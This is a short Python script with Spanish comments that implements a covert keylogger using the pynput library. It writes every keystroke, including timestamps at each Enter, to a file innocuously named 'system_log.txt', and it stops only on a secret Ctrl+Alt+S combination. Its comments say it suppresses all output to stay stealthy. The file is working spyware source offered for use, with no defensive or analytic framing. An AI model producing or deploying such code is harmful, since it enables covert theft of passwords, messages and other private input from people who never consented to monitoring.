from pynput import keyboard
from datetime import datetime

# Archivo de salida
LOG_FILE = "system_log.txt"

# Combinación secreta: Ctrl Izquierdo + Alt Izquierdo + S
COMBINACION_CIERRE = {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.KeyCode.from_char('s')}
teclas_presionadas = set()

def grabar_en_archivo(texto):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(texto)

def on_press(key):
    # 1. Gestionar cierre secreto
    if key in COMBINACION_CIERRE:
        teclas_presionadas.add(key)
        if all(k in teclas_presionadas for k in COMBINACION_CIERRE):
            return False 

    # 2. Procesar la tecla para que sea legible
    try:
        # Si es una letra o número normal
        char = key.char
        grabar_en_archivo(char)
    except AttributeError:
        # Si es una tecla especial (Enter, Espacio, etc.)
        if key == keyboard.Key.space:
            grabar_en_archivo(" ")
        elif key == keyboard.Key.enter:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            grabar_en_archivo(f" [ENTER - {timestamp}]\n")
        elif key == keyboard.Key.backspace:
            grabar_en_archivo("[BACK]")
        else:
            # Otras teclas (Shift, CapsLock, etc.) las grabamos discretamente
            grabar_en_archivo(f"[{key.name.upper()}]")

def on_release(key):
    if key in teclas_presionadas:
        teclas_presionadas.remove(key)

def main():
    # Sin prints ni avisos para mantener el sigilo profesional
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()